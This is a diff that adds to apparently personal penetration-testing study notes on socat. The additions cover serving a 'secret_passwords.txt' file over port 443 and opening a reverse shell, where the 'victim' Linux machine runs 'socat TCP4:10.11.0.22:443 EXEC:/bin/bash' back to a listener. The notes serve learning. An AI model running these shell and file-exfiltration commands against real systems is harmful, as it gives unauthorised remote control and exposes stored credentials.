@@ -45,4 +45,18 @@ socat TCP4-LISTEN:443 STDOUT
 
 ## Socat File Transfer
 
+sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt   #share file on 443 // fork create chilp process when create listener
+// on other machine we download the file:
+socat TCP4:10.10.11.1(ip of the sharing machine):443 file:received_secret>passwords.txt,create
+//check the file on Windows machine by --> type received_secret_passwords.txt --> print the content of the file
+
+## Socat Reverse Shells
+we start listener on Win mashine:
+socat -d -d TCP4-LISTEN:443 STDOUT            # -d -d increase the verbousity of the output
+and on the victim Linux machine:
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash      #check by whoami or id commands
+
+## Socat Encrypted Bind Shells
+
+
 
